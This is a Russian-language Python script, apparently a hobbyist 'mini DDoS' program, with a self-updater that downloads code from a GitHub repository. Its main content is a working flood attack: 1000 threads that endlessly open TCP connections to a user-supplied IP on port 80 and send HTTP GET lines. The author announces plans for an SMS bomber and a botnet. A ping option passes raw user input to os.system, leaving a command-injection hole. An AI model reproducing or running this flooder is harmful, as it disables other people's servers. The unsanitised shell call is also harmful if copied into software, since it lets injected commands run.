#!/bin/sh



#version 4.2
#by SKATT
import os
print('Установка дополнительных модулей...')
os.system('pip install requests')
os.system('pip install colorama')
print('Импортирую модули...')
import colorama
import socket
import requests
import threading
import time
print('Импортирую цвета...')
from colorama import Fore
colorama.init()
print('Запуск программы...')
version = 'v4.2'
print(version)
print(Fore.GREEN + 'created bySKATT')
time.sleep(1)

print(Fore.YELLOW + 'Проверка Обновлений')
VERSION_URL = 'https://api.github.com/repos/POHel/mini-ddos-programm/releases/latest'
DOWNLOAD_URL = 'https://github.com/POHel/mini-ddos-programm/archive/refs/heads/main.zip'

def update_program(owner, repo, file):
    response = requests.get(VERSION_URL.format(owner=owner, repo=repo)).json()
    latest_version = response['tag_name']

    if latest_version != version:
        print(Fore.MAGENTA + '[!]' + Fore.YELLOW + 'Доступно обновление')
        print(Fore.BLUE + 'Загружаю обновление')
        download_url = DOWNLOAD_URL.format(owner=owner, repo=repo, file=file)
        r = requests.get(download_url, allow_redirects=True)
        open(file, 'wb').write(r.content)
        print(Fore.MAGENTA + '[!]' + Fore.GREEN + 'Обновление Загружено')

    if latest_version == version:
        print(Fore.MAGENTA + '[!]' + Fore.GREEN + 'Установлена самая последняя версия')

if __name__ == '__main__':
    update_program('POHel', 'mini-ddos-programm', 'main.zip')
time.sleep(1)

print(Fore.BLUE + 'Определяю OS...')
time.sleep(1)
print('Ваша ос: ', os.name)
time.sleep(3)
if os.name == 'nt':
    os.system('cls')
else:
    os.system('clear')
print(Fore.RED + '''

                     ▄█▀▀▀█▄████▀▀▀██▄   ▄▄█▀▀██▄  ▄█▀▀▀█▄█
                    ▄██    ▀█ ██    ▀██▄██▀    ▀██▄██    ▀█
                    ▀███▄     ██     ▀███▀      ▀█████▄
                      ▀█████▄ ██      ███        ██ ▀█████▄
                    ▄     ▀██ ██     ▄███▄      ▄██     ▀██
                    ██     ██ ██    ▄██▀██▄    ▄██▀█     ██
                    █▀█████▀▄████████▀   ▀▀████▀▀ █▀█████▀
''')
print(Fore.GREEN + 'created bySKATT')
print(Fore.BLUE + 'Ваша ос: ', os.name)
print(version)
print(Fore.YELLOW + '''
    !О БУДУЮЩИХ ОБНОВЛЕНИЯХ!
    Планирую  усилить мощность ддоса, чтобы программа была эффективнее
    А ещё хочу сделать типо ботнет для автоматизации запуска программы на всех имеющихся у вас машинах 
    (чтобы суммировать вычислительную мощность)
    А дальше предложите свои идеи
''')
print(Fore.MAGENTA + '''
Выберите действие:
[1] DDOS-(by ip)
[2] ping
[3] SMS bomber

    ''')

while True:
    print(Fore.GREEN + '')
    number = (input('Введите цифру: '))
    if number == '1':
        if os.name == 'nt':
            os.system('cls')
        else:
            os.system('clear')
        print(Fore.RED + '''
            Если возникают ошибки, то вот возможные причины:
            1)Плохое соединение с интернетом
            2)Некорректно введён IP адрес
            3)Сервер не может обработать ваши звпросы
            (это хорошо, кто не знает это означает что сервер начал лагать или же это 1 пункт)
            4)Возможно вы положили сайт :)
            (но это не точно)
        ''')
        print(Fore.MAGENTA + '[!]' + Fore.RED + 'Чтобы остановить програму нажмите ctrl + c, или просто перезапустите программу')
        print(Fore.GREEN + '')
        ip = input('введите IP: ')
        target = ip
        port = 80
        attack_num = 1

        def attack():
            while True:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
                                        
                global attack_num
                attack_num += 1
                print(attack_num)

                s.close()
        for i in range(1000):
            thread = threading.Thread(target=attack)
            thread.start()

    elif number == '2':
        if os.name == 'nt':
            os.system('cls')
        else:
            os.system('clear')
        print(Fore.CYAN + '')
        print('starting ping...')
        time.sleep(1.5)
        piip = input('Введите ip: ')
        os.system('ping ' + piip + ' -t')

    elif number == '3':
        print(Fore.RED + 'В разработке!')








    else:
        print(Fore.RED + 'Выбрано не верное число')